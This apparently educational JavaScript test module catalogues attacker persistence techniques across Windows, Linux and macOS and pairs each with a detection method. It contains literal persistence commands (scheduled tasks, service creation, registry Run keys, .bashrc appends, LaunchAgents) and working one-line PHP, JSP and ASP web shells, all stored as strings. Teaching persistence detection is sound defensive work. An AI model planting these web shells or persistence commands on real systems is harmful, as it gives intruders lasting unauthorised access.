/**
 * EDUCATIONAL HACKING TUTORIALS
 * Module 4: Advanced Techniques
 * Lesson 3: Persistence Mechanisms
 * 
 * ⚠️ IMPORTANT: Educational Purpose Only
 * 
 * Learning Objectives:
 * - Understand persistence mechanisms
 * - Learn various persistence techniques
 * - Practice defensive persistence detection
 */

import { expect } from "chai";

console.log("=== PERSISTENCE MECHANISMS ===");
console.log("⚠️  FOR EDUCATIONAL AND SECURITY TESTING PURPOSES ONLY");

// Persistence Framework
class PersistenceFramework {
  constructor() {
    this.mechanisms = [];
    this.detectionResults = [];
  }

  analyzeScheduledTasks() {
    console.log(`\n🔍 Analyzing Scheduled Tasks`);
    
    const analysis = {
      type: "Scheduled Tasks",
      techniques: [],
      detection: []
    };
    
    // Common scheduled task persistence techniques
    const techniques = [
      {
        name: "Windows Task Scheduler",
        command: "schtasks /create /tn 'UpdateTask' /tr 'payload.exe' /sc onlogon",
        location: "Windows Task Scheduler",
        detection: "Monitor schtasks.exe and task scheduler events"
      },
      {
        name: "Cron Jobs (Linux)",
        command: "* * * * * /path/to/payload.sh",
        location: "/etc/crontab or user crontab",
        detection: "Monitor /etc/crontab and crontab -l output"
      },
      {
        name: "Launch Agents (macOS)",
        command: "launchctl load ~/Library/LaunchAgents/com.evil.plist",
        location: "~/Library/LaunchAgents/",
        detection: "Monitor LaunchAgents directory"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  analyzeServiceInstallation() {
    console.log(`\n🔍 Analyzing Service Installation`);
    
    const analysis = {
      type: "Service Installation",
      techniques: [],
      detection: []
    };
    
    const techniques = [
      {
        name: "Windows Service",
        command: "sc create PersistService binPath= 'C:\\path\\to\\payload.exe'",
        location: "Windows Services",
        detection: "Monitor service creation events and service registry"
      },
      {
        name: "Linux Systemd Service",
        command: "systemctl enable persist.service",
        location: "/etc/systemd/system/",
        detection: "Monitor systemd service files and systemctl commands"
      },
      {
        name: "macOS Launch Daemon",
        command: "launchctl load /Library/LaunchDaemons/com.evil.plist",
        location: "/Library/LaunchDaemons/",
        detection: "Monitor LaunchDaemons directory"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  analyzeRegistryModifications() {
    console.log(`\n🔍 Analyzing Registry Modifications`);
    
    const analysis = {
      type: "Registry Modifications",
      techniques: [],
      detection: []
    };
    
    const techniques = [
      {
        name: "Run Key",
        location: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        command: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persist /t REG_SZ /d payload.exe",
        detection: "Monitor registry Run keys"
      },
      {
        name: "RunOnce Key",
        location: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        command: "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v Persist /t REG_SZ /d payload.exe",
        detection: "Monitor registry RunOnce keys"
      },
      {
        name: "Winlogon",
        location: "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        command: "Modify Shell or Userinit values",
        detection: "Monitor Winlogon registry keys"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  analyzeStartupScripts() {
    console.log(`\n🔍 Analyzing Startup Scripts`);
    
    const analysis = {
      type: "Startup Scripts",
      techniques: [],
      detection: []
    };
    
    const techniques = [
      {
        name: "Windows Startup Folder",
        location: "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        command: "copy payload.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        detection: "Monitor startup folder for new files"
      },
      {
        name: "Linux .bashrc/.profile",
        location: "~/.bashrc or ~/.profile",
        command: "echo 'payload.sh' >> ~/.bashrc",
        detection: "Monitor .bashrc and .profile modifications"
      },
      {
        name: "macOS Login Items",
        location: "~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm",
        command: "osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/path/to/payload\"}'",
        detection: "Monitor login items"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  analyzeWebShells() {
    console.log(`\n🔍 Analyzing Web Shells`);
    
    const analysis = {
      type: "Web Shells",
      techniques: [],
      detection: []
    };
    
    const techniques = [
      {
        name: "PHP Web Shell",
        location: "Web server directory",
        example: "<?php system($_GET['cmd']); ?>",
        detection: "Monitor web server directories for suspicious PHP files"
      },
      {
        name: "JSP Web Shell",
        location: "Web application directory",
        example: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        detection: "Monitor JSP file uploads and modifications"
      },
      {
        name: "ASP Web Shell",
        location: "IIS web directory",
        example: "<%eval request(\"cmd\")%>",
        detection: "Monitor ASP file uploads"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  analyzeBackdoorTechniques() {
    console.log(`\n🔍 Analyzing Backdoor Techniques`);
    
    const analysis = {
      type: "Backdoors",
      techniques: [],
      detection: []
    };
    
    const techniques = [
      {
        name: "SSH Backdoor",
        description: "Modify SSH configuration or authorized_keys",
        detection: "Monitor SSH configuration and authorized_keys files"
      },
      {
        name: "RDP Backdoor",
        description: "Enable RDP and add backdoor user",
        detection: "Monitor RDP configuration and user accounts"
      },
      {
        name: "Network Backdoor",
        description: "Open listening port for remote access",
        detection: "Monitor network connections and listening ports"
      },
      {
        name: "Trojanized System Binary",
        description: "Replace system binary with trojanized version",
        detection: "File integrity monitoring and hash verification"
      }
    ];
    
    analysis.techniques = techniques;
    analysis.detection = techniques.map(t => t.detection);
    
    this.mechanisms.push(analysis);
    return analysis;
  }

  detectPersistence() {
    console.log(`\n🔍 Detecting Persistence Mechanisms`);
    
    const detection = {
      checks: [],
      tools: [],
      indicators: []
    };
    
    // Detection checks
    detection.checks = [
      "Monitor scheduled tasks",
      "Monitor service installations",
      "Monitor registry modifications",
      "Monitor startup folder",
      "Monitor web server directories",
      "Monitor SSH configuration",
      "Monitor network connections",
      "Monitor file integrity"
    ];
    
    // Detection tools
    detection.tools = [
      "Sysmon (Windows)",
      "Process Monitor",
      "Windows Event Logs",
      "File Integrity Monitoring",
      "Network Monitoring",
      "SIEM",
      "EDR (Endpoint Detection and Response)"
    ];
    
    // Indicators of compromise
    detection.indicators = [
      "Unusual scheduled tasks",
      "Unknown services",
      "Registry modifications",
      "Files in startup folder",
      "Suspicious web files",
      "Unusual network connections",
      "Modified system binaries"
    ];
    
    this.detectionResults.push(detection);
    return detection;
  }

  generatePersistenceReport() {
    console.log("\n📊 Persistence Mechanisms Report:");
    console.log("=" .repeat(50));
    
    console.log(`Total Mechanisms Analyzed: ${this.mechanisms.length}`);
    
    this.mechanisms.forEach((mechanism, index) => {
      console.log(`\n${index + 1}. ${mechanism.type}:`);
      console.log(`   Techniques: ${mechanism.techniques.length}`);
      console.log(`   Detection Methods: ${mechanism.detection.length}`);
    });
    
    if (this.detectionResults.length > 0) {
      console.log(`\nDetection Capabilities: ${this.detectionResults[0].checks.length} checks`);
      console.log(`Detection Tools: ${this.detectionResults[0].tools.length} tools`);
    }
    
    console.log("=" .repeat(50));
    
    return {
      mechanisms: this.mechanisms.length,
      detection: this.detectionResults.length > 0 ? this.detectionResults[0] : null
    };
  }
}

// Test Scenarios
async function testScheduledTasks() {
  console.log("\n📝 Test 1: Scheduled Tasks Analysis");
  
  const framework = new PersistenceFramework();
  const analysis = framework.analyzeScheduledTasks();
  
  expect(analysis).to.have.property("techniques");
  expect(analysis.techniques.length).to.be.greaterThan(0);
  console.log(`✅ Analyzed ${analysis.techniques.length} scheduled task techniques`);
}

async function testServiceInstallation() {
  console.log("\n📝 Test 2: Service Installation Analysis");
  
  const framework = new PersistenceFramework();
  const analysis = framework.analyzeServiceInstallation();
  
  expect(analysis).to.have.property("techniques");
  expect(analysis.techniques.length).to.be.greaterThan(0);
  console.log(`✅ Analyzed ${analysis.techniques.length} service installation techniques`);
}

async function testRegistryModifications() {
  console.log("\n📝 Test 3: Registry Modifications Analysis");
  
  const framework = new PersistenceFramework();
  const analysis = framework.analyzeRegistryModifications();
  
  expect(analysis).to.have.property("techniques");
  expect(analysis.techniques.length).to.be.greaterThan(0);
  console.log(`✅ Analyzed ${analysis.techniques.length} registry modification techniques`);
}

async function testPersistenceDetection() {
  console.log("\n📝 Test 4: Persistence Detection");
  
  const framework = new PersistenceFramework();
  const detection = framework.detectPersistence();
  
  expect(detection).to.have.property("checks");
  expect(detection).to.have.property("tools");
  expect(detection.checks.length).to.be.greaterThan(0);
  console.log(`✅ Identified ${detection.checks.length} detection checks`);
}

async function testPersistenceReport() {
  console.log("\n📝 Test 5: Generate Persistence Report");
  
  const framework = new PersistenceFramework();
  framework.analyzeScheduledTasks();
  framework.analyzeServiceInstallation();
  framework.detectPersistence();
  
  const report = framework.generatePersistenceReport();
  expect(report).to.have.property("mechanisms");
  expect(report.mechanisms).to.be.greaterThan(0);
  
  console.log("✅ Persistence mechanisms report generation test passed");
}

// Run all tests
(async () => {
  try {
    console.log("\n⚠️  REMINDER: This tutorial is for educational purposes only.");
    console.log("   Only test persistence mechanisms on systems you own or have permission to test.\n");
    
    await testScheduledTasks();
    await testServiceInstallation();
    await testRegistryModifications();
    await testPersistenceDetection();
    await testPersistenceReport();
    
    console.log("\n✅ All persistence mechanism tests completed!");
    console.log("\n📚 Key Takeaways:");
    console.log("   - Monitor scheduled tasks and services");
    console.log("   - Track registry modifications");
    console.log("   - Monitor startup folders and scripts");
    console.log("   - Detect web shells and backdoors");
    console.log("   - Use file integrity monitoring");
    console.log("   - Implement comprehensive logging");
  } catch (error) {
    console.error("❌ Test failed:", error.message);
    process.exit(1);
  }
})();

